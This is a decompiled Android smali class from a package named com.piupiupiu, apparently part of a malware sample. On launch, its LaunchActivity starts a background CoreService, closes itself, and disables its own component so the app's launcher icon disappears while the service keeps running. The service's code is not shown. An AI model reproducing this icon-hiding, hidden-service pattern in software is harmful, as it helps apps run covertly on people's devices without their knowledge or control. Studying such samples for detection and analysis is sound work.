.class public Lcom/piupiupiu/LaunchActivity;
.super Landroid/app/Activity;


# direct methods
.method public constructor <init>()V
    .locals 0

    invoke-direct {p0}, Landroid/app/Activity;-><init>()V

    return-void
.end method

.method private a()V
    .locals 4

    invoke-virtual {p0}, Lcom/piupiupiu/LaunchActivity;->getPackageManager()Landroid/content/pm/PackageManager;

    move-result-object v0

    invoke-virtual {p0}, Lcom/piupiupiu/LaunchActivity;->getComponentName()Landroid/content/ComponentName;

    move-result-object v1

    const/4 v2, 0x2

    const/4 v3, 0x1

    invoke-virtual {v0, v1, v2, v3}, Landroid/content/pm/PackageManager;->setComponentEnabledSetting(Landroid/content/ComponentName;II)V

    return-void
.end method


# virtual methods
.method protected onCreate(Landroid/os/Bundle;)V
    .locals 2

    invoke-super {p0, p1}, Landroid/app/Activity;->onCreate(Landroid/os/Bundle;)V

    const/high16 v0, 0x7f030000

    invoke-virtual {p0, v0}, Lcom/piupiupiu/LaunchActivity;->setContentView(I)V

    new-instance v0, Landroid/content/Intent;

    const-class v1, Lcom/piupiupiu/CoreService;

    invoke-direct {v0, p0, v1}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    invoke-virtual {p0, v0}, Lcom/piupiupiu/LaunchActivity;->startService(Landroid/content/Intent;)Landroid/content/ComponentName;

    invoke-virtual {p0}, Lcom/piupiupiu/LaunchActivity;->finish()V

    invoke-direct {p0}, Lcom/piupiupiu/LaunchActivity;->a()V

    return-void
.end method
